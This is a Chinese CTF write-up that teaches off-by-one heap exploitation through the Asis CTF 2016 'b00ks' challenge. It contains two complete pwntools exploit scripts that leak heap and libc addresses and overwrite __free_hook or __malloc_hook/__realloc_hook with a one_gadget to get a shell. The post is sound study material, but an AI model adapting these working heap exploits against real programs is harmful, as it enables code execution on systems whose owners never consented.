
---
title:  从对b00k题目学习中初习off-by-one——学pwn小记(7)
categories: [CTF]
tags: [pwn]

---

 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节的情况。我看 off-by-one的理论是字字都看得懂，但是一到off-by-one的实际利用时确是不知道怎么办了。于是找了Asis CTF 2016 b00ks这道经典off-by-one题来复现学习。
<!-- more -->
##  b00ks

### 题目分析

通过分析题目可以发现，在处理author name这个函数有一个数组越界。

![image-20210409221800526](image-20210409221800526.png)

仔细观察sub_9F5函数内部细节，可以看到当i=a2，`for`循环依然会进行一次读取字符操作。导致我们实际读取了a2+1个字符。（即是`off-by-one` 漏洞）

![image-20210409222059169](image-20210409222059169.png)

同时通过审计加入书籍的函数，我们发现每加入一本书，有三个chunk被创建，第一个chunk是关于书名的，第二个是关于书的介绍，第三个是书前两个地址的保存。

![image-20210409223627387](image-20210409223627387.png)

分析删除函数可以看到，只是free的指针和将指向book chunk的指针地址清零并没有清空chunk里的内容。（可能有uaf）

![image-20210409224516738](image-20210409224516738.png)

分析打印函数，可以看到，在调用时不仅输出了所有的还存在的chunk的book name 与description还输出了author name。

![image-20210409225141070](image-20210409225141070.png)

同时还发现author name与保存book chunk addr的数组挨得很近：

![image-20210409225844109](image-20210409225844109.png)

book chunk addr的数组可能被溢出到。经过gdb发现，刚好可以溢出一位`\x00`到book chunk addr的数组的第一个元素中。

![image-20210409231252054](image-20210409231252054.png)

又book chunk addr的数组里存放的是book chunk的地址，book chunk里存放着book name chunk和description chunk的地址。故，我们可以在第一本book的description chunk里创造一个伪造是book chunk的fake chunk，然后通过author name溢出的一个`\x00`让book chunk addr的数组的第一个元素指针变成我们伪造fake chunk。这样我们就控制住了第一个book中book chunk。（但一次程序时只能控制一次）

### 利用数组越界得到book1 chunk addr

同时根据上面的分析，我们若在创造程序时，写入了0x20个字符。字符串结尾的'\x00'会在新的一本书创建时覆盖掉。

![image-20210410120812585](image-20210410120812585.png)

导致我们在输出author book时book1 chunk addr被泄露掉。

![image-20210410120951639](image-20210410120951639.png)

从而可以推算出任意chunk的地址

### 思路1：利用mmap特性leak基地址

同时由于mmap 在申请一块超级大内存时,会单独映射一块内存而不是从top chunk划分.这个内存地址与libc的基地址的相对地址是不变的.因此我们可以创建在第二个book时用mmap申请两个chunk.再通过fake打印第二个book chunk中保存地址从而获得libc基地址.

![image-20210410113701106](image-20210410113701106.png)

我们再利用fake chunk的内容修改book2 chunk 的里description chunk地址修改为`__free_hook`的地址,这样我们在编辑book2 description时,其实是在向`__free_hook`写入内容.我们可以用此方法写入one_gadget.

（`__free_hook`的地址我们可以在gdb中，用`x/36gx &__free_hook`来找到`__free_hook`的地址。）

再通过free来触发。

#### exp

```python
from pwn import *

e=ELF('./b00ks')
p=process('./b00ks')
p.sendline('s'*0x20)
def add(ns,na,ds,da):
	p.sendline('1')
	p.sendlineafter('name size:',str(ns))
	p.sendlineafter('name',na)
	p.sendlineafter('description size',str(ds))
	p.sendlineafter('description',da)
def edit(num,da):
	p.sendline('3')
	p.sendlineafter("edit",str(num))
	p.sendlineafter('description',da)
def echo():
	p.sendline('4')

def free(num):
	p.sendline('2')
	p.sendline('num')

def change(name):
	p.sendline('5')
	p.sendlineafter('name',name)

#泄露book1 chunk addr
add(0xd0,'a'*0x10,0x20,'cba')
add(0x42000,'b'*0x10,0x42000,'cba')
echo()
p.recvuntil('Author: ssssssssssssssssssssssssssssssss')
x=p.recv(6).ljust(8,"\00")
print(hex(u64(x)))
book1=u64(x)
book2=book1+0x30
log.info('book1_dr:'+hex(book1))
log.info('book2_dr:'+hex(book2))
#通过mmap 泄露出基地址
fake=p64(1)+p64(book2+0x8)*2+p64(0x20)
edit(1,fake)
change('A'*0X20)
echo()
p.recvuntil('Name: ')
x=p.recv(6).ljust(8,"\00")
print(hex(u64(x)))
book2_mmap=u64(x)
log.info('book2_mmap:'+hex(book2_mmap))
base=book2_mmap-0x590010
log.info('base:'+hex(base))
#修改book2 chunk 中 description addr 为free hook地址
#并在free hook写入one_gadget
free_hook=0x3c67a8+base
log.info('free_hook:'+hex(free_hook))
edit(1,p64(free_hook)*2)
edit(2,p64(base+0x4527a))
free(2)

p.interactive() 
```

### 思路2: Fastbin Attack 泄露libc写入shell

审计代码可以发现，程序在释放book时，并没有将所有申请的chunk的内容清空。我们可以申请一个unsorted bin ，再释放掉从而leak出main_arena附近一地址从而算出基地址。在创造一个0x70的fast bin，让其fd能被我们控制写。 再控制fake chunk的让有读能力的book name chunk的地址指向free 出unsorted bin所泄露的地址，有写能力的description chunk的地址指向fast bin的fd。

![image-20210410133403130](image-20210410133403130.png)

再修改fast bin的fd指向我们在`__malloc_hook`-0x30+0xd处的falk chunk。

![image-20210410133926118](image-20210410133926118.png)

由于利用这个新伪造的chunk，本地`__malloc_hook`写one_gadget没有打通。所以覆盖`__realloc_hook`及`__malloc_hook`处的数据。利于`__realloc_hook`来调节堆栈。

![image-20210410133852514](image-20210410133852514.png)

于是在`__realloc_hook`处写one_gadget的地址，在`__malloc_hook`处写`__libc_realloc`的地址。

我们通过gdb 命令 `disassemble __libc_realloc`来搜寻我们适合的地址。

![image-20210410134609947](image-20210410134609947.png)

前面几个push的地址我们都可以看情况来选用。

#### exp

```python
from pwn import *

#e=ELF('./spwnlibc-2.23.so')
p=process('./b00ks')#remote('node3.buuoj.cn',29407)
#process('./b00ks')
p.sendline('s'*0x20)
def add(ns,na,ds,da):
	p.sendline('1')
	p.sendlineafter('name size:',str(ns))
	p.sendlineafter('name',na)
	p.sendlineafter('description size',str(ds))
	p.sendlineafter('description',da)
def edit(num,da):
	p.sendline('3')
	p.sendlineafter("edit",str(num))
	p.sendlineafter('description',da)
def echo():
	p.sendline('4')

def free(num):
	p.sendline('2')
	p.sendline(str(num))

def change(name):
	p.sendline('5')
	p.sendlineafter('name',name)


add(0xd0,'a'*0x10,0x20,'cba')
add(0x80,'b'*0x10,0x60,'cba')
add(0x10,'a'*0x10,0x10,'b'*0x10)
free(2)
echo()
p.recvuntil('Author: ssssssssssssssssssssssssssssssss')
x=p.recv(6).ljust(8,"\00")
print(hex(u64(x)))
book1=u64(x)
book2=book1+0x30
log.info('book1_dr:'+hex(book1))
log.info('book2_dr:'+hex(book2))
log.info('book3_dr:'+hex(book1+0xc0))
#unsorted bin泄露地址
fake=p64(1)+p64(book2+0x8)+p64(book1+0xc0)+p64(0x20)
edit(1,fake)
change('b'*0x20)
echo()
p.recvuntil('Name: ')
x=p.recv(6).ljust(8,"\00")
addr=u64(x)
log.info('bin_addr:'+hex(addr))
base=addr-0x3c4b78
log.info('base:'+hex(base))
malloc_hook=0x3c4b10+base
log.info('malloc_hook:'+hex(malloc_hook))
#修改fd 让伪造chunk 进入fast bin
fake2=p64(malloc_hook-0x30+0xd)
edit(1,fake2)
#free(3)
add(0x20,'b'*0x10,0x60,'cba')
add(0x20,'b'*0x10,0x60,'a'*3+p64(0)*2)
echo()
#申请伪造chunk 写入__malloc_hook与__realloc_hook
one=base+0x4527a
log.info('one_gadget:'+hex(one))
realloc_addr=base+0x8471d
log.info('one_gadget:'+hex(one))
edit(5,'a'*3+p64(0)+p64(one)+p64(realloc_addr))
free(3)


p.sendline('1')
p.sendlineafter('name size:',str(10))


p.interactive() 
```



## off-by-one的常见点与利用思路

off-by-one的常见发生在边界验证时：

1.使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节.

2.字符串操作判断时。

off-by-one的常见利用思路：

1.溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法
		2.溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理;（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。

## 参考文献

https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/

https://www.cnblogs.com/bhxdn/p/14293978.html